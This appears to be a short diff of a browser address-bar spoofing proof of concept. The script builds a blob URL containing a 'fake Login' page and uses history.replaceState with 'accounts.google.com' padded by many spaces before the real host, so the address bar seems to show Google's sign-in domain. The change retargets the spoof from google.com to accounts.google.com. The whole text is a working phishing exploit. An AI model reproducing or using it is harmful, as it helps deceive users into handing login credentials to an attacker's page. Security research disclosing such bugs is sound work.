@@ -1,7 +1,8 @@
 <script>
-var exp = '<h1>fake Login</h1><script>history.replaceState("","","blob:'+location.protocol+'//google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
+var exp = '<h1>fake Login</h1><script>history.replaceState("","","blob:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
 location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
 </script>
+
 
 
 
